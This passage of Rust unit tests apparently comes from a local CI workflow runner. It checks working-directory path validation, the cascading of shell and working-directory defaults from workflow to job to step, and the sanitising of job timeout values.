            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("Invalid working-directory"));
    }

    #[tokio::test]
    async fn working_directory_allows_subdirectory() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo ok");
        step.working_directory = Some("src/app".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        // No container calls should have failed
        let calls = runtime.run_calls.lock().unwrap();
        assert_eq!(calls.len(), 1);
    }

    #[tokio::test]
    async fn working_directory_rejects_absolute_path() {
        let runtime = MockContainerRuntime::default();
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo pwned");
        step.working_directory = Some("/tmp/evil".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Failure);
        assert!(result.output.contains("Invalid working-directory"));
    }

    // --- Defaults cascade tests ---

    #[tokio::test]
    async fn defaults_cascade_job_overrides_workflow() {
        let runtime = MockContainerRuntime::default();
        let workflow_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("sh".to_string()),
                working_directory: None,
            }),
        };
        let job_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("python".to_string()),
                working_directory: None,
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("print('hello')");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: Some(&workflow_defaults),
            job_defaults: Some(&job_defaults),
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        // Job defaults (python) should override workflow defaults (sh)
        assert_eq!(cmd[0], "python");
        assert_eq!(cmd[1], "-c");
    }

    #[tokio::test]
    async fn defaults_cascade_step_overrides_job() {
        let runtime = MockContainerRuntime::default();
        let job_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("python".to_string()),
                working_directory: None,
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let mut step = make_run_step("echo hello");
        step.shell = Some("sh".to_string());

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: Some(&job_defaults),
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        // Step shell (sh) should override job defaults (python)
        assert_eq!(cmd[0], "sh");
        assert_eq!(cmd[1], "-e");
        assert_eq!(cmd[2], "-c");
    }

    #[tokio::test]
    async fn defaults_cascade_workflow_used_when_no_job_or_step() {
        let runtime = MockContainerRuntime::default();
        let workflow_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: Some("sh".to_string()),
                working_directory: None,
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("echo hello");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: Some(&workflow_defaults),
            job_defaults: None,
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);

        let calls = runtime.run_calls.lock().unwrap();
        let cmd = &calls[0].cmd;
        // Workflow defaults (sh) should be used
        assert_eq!(cmd[0], "sh");
    }

    #[tokio::test]
    async fn defaults_cascade_working_directory_from_job() {
        let runtime = MockContainerRuntime::default();
        let job_defaults = workflow::Defaults {
            run: Some(workflow::DefaultsRun {
                shell: None,
                working_directory: Some("src".to_string()),
            }),
        };
        let workflow = minimal_workflow();
        let job_env = HashMap::new();
        let working_dir = std::env::current_dir().unwrap();

        let step = make_run_step("echo ok");

        let ctx = StepExecutionContext {
            step: &step,
            step_idx: 0,
            job_env: &job_env,
            working_dir: &working_dir,
            runtime: &runtime,
            workflow: &workflow,
            runner_image: "ubuntu:latest",
            verbose: false,
            matrix_combination: &None,
            secret_manager: None,
            secret_masker: None,
            container_config: None,
            workflow_defaults: None,
            job_defaults: Some(&job_defaults),
        };

        let result = execute_step(ctx).await.unwrap();
        assert_eq!(result.status, StepStatus::Success);
        // Should succeed — "src" is a valid subdirectory path
    }

    // --- sanitize_timeout_minutes tests ---

    #[test]
    fn sanitize_timeout_none_returns_default() {
        assert_eq!(sanitize_timeout_minutes(None, 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_positive_value_returned() {
        assert_eq!(sanitize_timeout_minutes(Some(30.0), 360.0), 30.0);
    }

    #[test]
    fn sanitize_timeout_nan_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(f64::NAN), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_infinity_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(f64::INFINITY), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_neg_infinity_returns_default() {
        assert_eq!(
            sanitize_timeout_minutes(Some(f64::NEG_INFINITY), 360.0),
            360.0
        );
    }

    #[test]
    fn sanitize_timeout_zero_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(0.0), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_negative_returns_default() {
        assert_eq!(sanitize_timeout_minutes(Some(-5.0), 360.0), 360.0);
    }

    #[test]
    fn sanitize_timeout_clamps_to_max() {
        // 360 * 24 = 8640
        assert_eq!(sanitize_timeout_minutes(Some(99999.0), 360.0), 8640.0);
    }

    // --- Job-level timeout test ---

    #[tokio::test]
    async fn job_timeout_produces_failure_result() {
        // Use a very short timeout wrapping a step that sleeps longer
        let timeout_mins = 0.0001; // ~6ms
        let dur = std::time::Duration::from_secs_f64(
            sanitize_timeout_minutes(Some(timeout_mins), 360.0) * 60.0,
        );

        let step_loop = async {
            // Simulate a step that takes longer than the timeout
            tokio::time::sleep(std::time::Duration::from_millis(500)).await;
            Ok::<(), ExecutionError>(())
        };

        let result = tokio::time::timeout(dur, step_loop).await;
        assert!(result.is_err(), "Expected timeout but step completed");
    }
}
